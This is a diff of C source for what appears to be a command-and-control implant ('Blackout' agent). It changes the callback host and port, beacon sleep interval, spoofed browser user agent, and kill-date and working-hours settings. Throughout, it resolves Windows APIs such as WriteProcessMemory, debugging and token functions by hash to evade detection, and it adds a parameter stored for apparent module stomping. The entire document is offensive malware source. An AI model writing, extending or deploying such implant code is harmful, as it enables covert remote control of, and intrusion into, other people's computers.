@@ -2,15 +2,17 @@
 #include <utils.h>
 #include <constexpr.h>
 
-#define CONFIG_HOST       L"172.29.29.80"
-#define CONFIG_PORT       4433
+#define CONFIG_HOST       L"172.25.31.176"
+#define CONFIG_PORT       803
 #define CONFIG_USERAGENT  L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
 #define CONFIG_SECURE     FALSE
 #define CONFIG_WRKHRS     NULL
 #define CONFIG_KILLDATE   NULL
-#define CONFIG_SLEEP      5
+#define CONFIG_SLEEP      15
 
-FUNC VOID BlackoutInit() {
+FUNC VOID BlackoutInit( 
+    PVOID Param
+ ) {
     BLACKOUT_INSTANCE
 
     Instance()->Teb = NtCurrentTeb();
@@ -36,6 +38,7 @@ FUNC VOID BlackoutInit() {
     Instance()->Win32.WriteProcessMemory        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "WriteProcessMemory" ) );
     Instance()->Win32.DebugActiveProcessStop    = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "DebugActiveProcessStop" ) );
     Instance()->Win32.ContinueDebugEvent        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "ContinueDebugEvent" ) );
+    Instance()->Win32.FreeLibrary               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "FreeLibrary" ) );
     Instance()->Win32.CloseHandle               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CloseHandle" ) );
     Instance()->Win32.GetLastError              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetLastError" ) );
     Instance()->Win32.LocalAlloc                = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LocalAlloc" ) );
@@ -125,7 +128,6 @@ FUNC VOID BlackoutInit() {
     Instance()->Win32.NtOpenProcessTokenEx      = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtOpenProcessTokenEx" ) ); 
     Instance()->Win32.NtOpenThreadToken         = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtOpenThreadToken" ) ); 
     Instance()->Win32.NtOpenThreadTokenEx       = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtOpenThreadTokenEx" ) ); 
-    
 
     Instance()->Modules.Winhttp      = Instance()->Win32.LoadLibraryA( "Winhttp.dll"  );
     Instance()->Modules.Advapi32     = Instance()->Win32.LoadLibraryA( "Advapi32.dll" );
@@ -158,6 +160,8 @@ FUNC VOID BlackoutInit() {
     Instance()->Win32.printf = LdrFuncAddr( Instance()->Modules.Msvcrt, HASH_STR( "printf" ) );
 
     /*============================[ Agent config initialization ]============================*/
+
+    if ( Param ) Instance()->StompArgs = Param;
 
     Instance()->Session.WorkingHours = CONFIG_WRKHRS;
     Instance()->Session.KillDate     = CONFIG_KILLDATE;
